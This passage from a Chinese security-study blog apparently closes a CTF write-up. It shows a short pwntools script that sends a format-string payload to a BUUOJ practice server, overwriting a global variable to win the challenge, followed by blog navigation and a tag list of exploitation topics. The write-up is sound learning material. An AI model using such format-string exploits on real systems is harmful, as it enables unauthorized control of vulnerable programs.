<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./fm&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26987</span>)</span><br><span class="line">x_addr = <span class="number">0x0804A02C</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>,&#123;x_addr:<span class="number">0x4</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>最终打通的结果如下：</p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-4.png"></p>
<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2>
	
	</div>
  <a type="button" href="/uncategorized/第六周笔记/#more" class="btn btn-default more">阅读此文</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
           <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一页</a>
        

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
       <a href="/page/2/" type="button" class="btn btn-default ">下一页<i class="fa fa-arrow-circle-o-right"></i></a>     
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="搜索" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
		
			
	<div class="widget">
		<h4>标签云</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="/tags/字符串漏洞/">字符串漏洞<span>1</span></a></li>
		
			<li><a href="/tags/Java/">Java<span>1</span></a></li>
		
			<li><a href="/tags/系统调用/">系统调用<span>2</span></a></li>
		
			<li><a href="/tags/BlueKeep漏洞/">BlueKeep漏洞<span>1</span></a></li>
		
			<li><a href="/tags/ret2dl-resolve/">ret2dl_resolve<span>1</span></a></li>
		
			<li><a href="/tags/栈与堆/">栈与堆<span>1</span></a></li>
		
			<li><a href="/tags/ret2shellcode/">ret2shellcode<span>2</span></a></li>
		
			<li><a href="/tags/栈溢出/">栈溢出<span>1</span></a></li>
		
			<li><a href="/tags/UAF/">UAF<span>1</span></a></li>
		
			<li><a href="/tags/格式化字符串溢出/">格式化字符串溢出<span>1</span></a></li>
		
			<li><a href="/tags/ret2VDSO/">ret2VDSO<span>1</span></a></li>
		
			<li><a href="/tags/栈迁移/">栈迁移<span>1</span></a></li>
		
			<li><a href="/tags/ret2libc/">ret2libc<span>4</span></a></li>
		
			<li><a href="/tags/C-C/">C/C++<span>1</span></a></li>
		
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>最新文章</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/uncategorized/[OGeek2019]babyrop/" ><i class="fa fa-file-o"></i>(OGeek2019)babyrop</a>
      </li>
    
      <li>
        <a href="/uncategorized/C、C++/" ><i class="fa fa-file-o"></i>C/C++</a>
      </li>
    
      <li>
        <a href="/uncategorized/Java基础学习/" ><i class="fa fa-file-o"></i>Java学习</a>
      </li>
    
      <li>
        <a href="/uncategorized/第一次作业/" ><i class="fa fa-file-o"></i>BlueKeep漏洞的发现与利用</a>
      </li>
    
      <li>
        <a href="/uncategorized/第二次作业/" ><i class="fa fa-file-o"></i>面向Linux系统下二进制漏洞防御技术的设计与实现</a>
      </li>
    
  </ul>
</div>

		
			
<div class="widget">
	<h4>链接</h4>
	<ul class="blogroll list-unstyled">
	
		<li><i class="false"></i><a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" title="" target="_blank"]);">hexo-theme-bithack</a></li>
	
	</ul>
</div>


		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2023 pdxbshx's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
